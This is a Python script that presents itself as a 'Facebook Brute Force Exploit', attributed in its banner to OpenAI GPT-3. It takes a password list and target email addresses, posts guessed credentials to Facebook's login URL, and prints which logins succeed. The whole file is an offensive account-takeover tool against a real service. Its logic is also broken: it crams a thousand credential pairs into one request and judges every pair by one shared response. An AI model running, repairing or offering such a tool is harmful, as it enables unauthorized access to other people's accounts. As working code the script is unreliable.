import time
import requests
import sys
import random

WAIT_TIME = 3
PASSWD_PER_REQUEST = 1000
DELAY_RANGE = (2, 3)

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def banner(argv, usage=False, url=None, emails=None):
    print(bcolors.OKBLUE + " __      __                        .___                             " + bcolors.ENDC)
    print(bcolors.OKBLUE + "/  \    /  \   ____   _______    __| _/ ______   _______    ____     ______   ______" + bcolors.ENDC)
    print(bcolors.OKBLUE + "\   \/\/   /  /  _ \  \_  __ \  / __ |  \____ \  \_  __ \ _/ __ \   /  ___/  /  ___/" + bcolors.ENDC)
    print(bcolors.OKBLUE + " \        /  (  <_> )  |  | \/ / /_/ |  |  |_> >  |  | \/ \  ___/   \___ \   \___ \ " + bcolors.ENDC)
    print(bcolors.OKBLUE + "  \__/\  /    \____/   |__|    \____ |  |   __/   |__|     \___  > /____  > /____  >" + bcolors.ENDC)
    print(bcolors.OKBLUE + "       \/                           \/  |__|                   \/       \/       \/ " + bcolors.ENDC)
    print(bcolors.OKBLUE + "" + bcolors.ENDC)
    print(bcolors.OKBLUE +
          "        \ /       _  _  __    _  _    ___ __    __ _  _  __ __" + bcolors.ENDC)
    print(bcolors.OKBLUE +
          "         X |V||  |_)|_)/     |_)|_)| | | |_    |_ / \|_)/  |_ " + bcolors.ENDC)
    print(bcolors.OKBLUE +
          '        / \| ||__| \|  \__   |_)| \|_| | |__   |  \_/| \\__|__' + bcolors.ENDC)
    print(bcolors.OKBLUE + "" + bcolors.ENDC)
    print("")
    print(bcolors.OKBLUE +
          "+ -- --=[Facebook Brute Force Exploit by OpenAI GPT-3" + bcolors.ENDC)
    if usage:
        print(bcolors.OKBLUE +
              "+ -- --=[Usage: %s http://facebook.com/login.php passwords.txt email [email2] [email3]..." % (argv[0]) + bcolors.ENDC)
        sys.exit(0)
    else:
        print(bcolors.WARNING + "+ -- --=[Brute forcing target: " +
              url + " with emails: " + str(emails) + "" + bcolors.ENDC)

def send_request(url, data):
    req = requests.post(url, data.encode('utf-8'))
    rsp = req.content.decode('utf-8')
    return rsp

def template(entries):
    t = 'email=%s&pass=%s'
    return '&'.join([t % (entry.get('email'), entry.get('passwd')) for entry in entries])

def attack(entries, url):
    if len(entries) < 1:
        return

    t = template(entries)
    response = send_request(url, t)

    # Check if any successful logins were found
    for entry in entries:
        if "Welcome to Facebook" in response:
            print(bcolors.OKGREEN + "Login successful!" + bcolors.ENDC)
            print(bcolors.OKGREEN + "Email: " + entry.get('email') + " Password: " + entry.get('passwd') + bcolors.ENDC)
        else:
            print(bcolors.FAIL + "Login failed!" + bcolors.ENDC)
            print(bcolors.FAIL + "Email: " + entry.get('email') + " Password: " + entry.get('passwd') + bcolors.ENDC)

def brute_force(url, passwords, emails):
    entries = []

    for email in emails:
        for password in passwords:
            entries.append({'email': email, 'passwd': password})
            if len(entries) >= PASSWD_PER_REQUEST:
                attack(entries, url)
                entries = []

    # Attack remaining entries
    attack(entries, url)

if __name__ == "__main__":
    if len(sys.argv) < 4:
        banner(sys.argv, usage=True)

    url = sys.argv[1]
    passwords_file = sys.argv[2]
    emails = sys.argv[3:]

    with open(passwords_file, 'r') as file:
        passwords = [line.strip() for line in file]

    banner(sys.argv, url=url, emails=emails)

    brute_force(url, passwords, emails)
